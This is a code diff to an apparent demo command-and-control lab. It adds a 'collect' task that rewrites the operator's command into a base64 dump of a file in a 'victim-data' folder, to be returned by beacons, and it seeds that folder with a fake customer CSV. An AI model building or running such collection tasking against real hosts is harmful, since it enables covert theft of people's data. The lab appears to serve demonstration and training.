@@ -42,6 +42,9 @@ QUERY_LOG = WORK_DIR / "queries.jsonl"
 COMPONENT_ROOT = WORK_DIR / "install"
 COMPONENT_INVENTORY = WORK_DIR / "installed-components.json"
 COMPONENT_LOG = WORK_DIR / "component.log"
+VICTIM_DATA = WORK_DIR / "victim-data"
+SAMPLE_FILE = "customers.csv"
+COLLECT_COMMAND = re.compile(r"collect\s+([A-Za-z0-9_.-]{1,64})", re.IGNORECASE)
 COMPONENT_NAME = re.compile(r"[a-z][a-z0-9-]{2,31}")
 COMPONENT_FILE = re.compile(r"[a-z][a-z0-9_-]{0,39}\.py")
 COMPONENT_ARGUMENT = re.compile(r"[A-Za-z0-9._:/-]{1,64}")
@@ -93,10 +96,32 @@ def _read_json_list(path: Path) -> list[object]:
     return value if isinstance(value, list) else []
 
 
+def ensure_sample_data() -> Path:
+    """Create the fake customer file the collect task reads."""
+    VICTIM_DATA.mkdir(parents=True, exist_ok=True)
+    path = VICTIM_DATA / SAMPLE_FILE
+    if not path.is_file():
+        rows = ["customer_id,name,email,plan,monthly_value"]
+        for index in range(1, 61):
+            rows.append(
+                f"CUST-{index:04d},Sample User {index},user{index}@example.test,"
+                f"Enterprise,{100 + index * 7}"
+            )
+        path.write_text("\n".join(rows) + "\n", encoding="utf-8")
+    return path
+
+
 def queue_task(command: str, target: str) -> str:
     command = command.strip()
+    requested = command
     if not command or len(command) > 500:
         raise ValueError("Enter a command between 1 and 500 characters.")
+    collect = COLLECT_COMMAND.fullmatch(command)
+    if collect:
+        sample = VICTIM_DATA / collect.group(1)
+        if not sample.is_file():
+            raise ValueError("No such sample file in the victim data directory.")
+        command = f"base64 -w0 {shlex.quote(str(sample))}; sleep 1"
     with lab_io_lock:
         beacons = _read_json(BEACONS_PATH) or {}
         if target != "all" and target not in beacons:
@@ -113,7 +138,7 @@ def queue_task(command: str, target: str) -> str:
         temporary.write_text(json.dumps(task, sort_keys=True, indent=2) + "\n", encoding="utf-8")
         os.replace(temporary, state.TASK_PATH)
         destination = "all beacons" if target == "all" else str(beacons[target].get("hostname", target))
-    return f"Queued '{command}' for {destination}."
+    return f"Queued '{requested}' for {destination}."
 
 
 def _fetch_catalog() -> tuple[dict[str, object], str]:
@@ -555,6 +580,7 @@ def reset_demo() -> str:
     with lab_io_lock:
         _clear_components()
         host.clear()
+        ensure_sample_data()
         install_version("v2", "Presenter reset client", schedule_callback=False, record_history=False)
         write_mode("passive")
         topology.stop_capture()
